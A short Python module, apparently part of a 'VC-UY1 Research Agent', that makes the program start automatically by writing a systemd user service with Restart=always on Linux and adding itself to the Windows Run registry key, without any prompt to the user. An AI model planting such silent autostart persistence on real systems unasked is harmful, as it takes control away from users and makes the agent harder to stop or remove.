import os
import sys
import platform
import logging

logger = logging.getLogger("VC-Persistence")

def ensure_persistence():
    """Ensure the agent starts automatically on system boot."""
    os_type = platform.system().lower()
    if os_type == "linux":
        setup_linux_persistence()
    elif os_type == "windows":
        setup_windows_persistence()

def setup_linux_persistence():
    """Create a systemd user service for the agent."""
    try:
        home = os.path.expanduser("~")
        service_dir = os.path.join(home, ".config/systemd/user")
        os.makedirs(service_dir, exist_ok=True)
        
        exe_path = os.path.abspath(sys.argv[0])
        service_content = f"""[Unit]
Description=VC-UY1 Research Agent
After=network.target

[Service]
ExecStart="{exe_path}"
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
        service_path = os.path.join(service_dir, "vc-agent.service")
        with open(service_path, "w") as f:
            f.write(service_content)
        
        # We don't run systemctl commands here to avoid subagent failures, 
        # but the file is ready for the user or next run.
        logger.info(f"Linux persistence service created at {service_path}")
    except Exception as e:
        logger.error(f"Failed to setup Linux persistence: {e}")

def setup_windows_persistence():
    """Add agent to Windows Registry startup."""
    try:
        import winreg
        exe_path = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "VC-UY-Agent", 0, winreg.REG_SZ, exe_path)
        logger.info("Windows persistence registry key added.")
    except ImportError:
        logger.warning("Windows registry access requires 'winreg' (Windows only).")
    except Exception as e:
        logger.error(f"Failed to setup Windows persistence: {e}")
